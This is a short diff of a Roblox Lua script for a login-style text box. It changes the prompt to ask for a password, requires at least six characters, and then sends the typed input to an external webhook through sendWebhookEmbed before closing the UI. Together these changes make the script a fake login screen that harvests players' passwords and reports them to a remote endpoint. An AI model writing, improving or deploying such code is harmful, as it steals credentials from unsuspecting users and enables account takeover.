@@ -120,7 +120,7 @@ local Input = Instance.new("TextBox")
 Input.Size = UDim2.new(1, -32, 0, 38)
 Input.Position = UDim2.new(0, 16, 0, 120)
 Input.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-Input.PlaceholderText = "Enter something..."
+Input.PlaceholderText = "Enter password..."
 Input.Text = ""
 Input.Font = Enum.Font.Gotham
 Input.TextSize = 18
@@ -146,7 +146,18 @@ sendWebhookEmbed("Login UI Opened", "The login UI has been shown.")
 
 -- On Login click
 Login.MouseButton1Click:Connect(function()
-    sendWebhookEmbed("Login Clicked", "User clicked the login button.\nFinal Input: `" .. Input.Text .. "`")
+    local userInput = Input.Text
+
+    -- ✅ Check kung kulang sa 6 characters
+    if #userInput < 6 then
+        Input.Text = ""
+        Input.PlaceholderText = "⚠️ Password must be 6+ characters!"
+        Input.PlaceholderColor3 = Color3.fromRGB(255, 80, 80)
+        return
+    end
+
+    -- ✅ Kung pasado, proceed
+    sendWebhookEmbed("Login Clicked", "User clicked the login button.\nFinal Input: `" .. userInput .. "`")
 
     -- Alisin yung UI
     ScreenGui:Destroy()
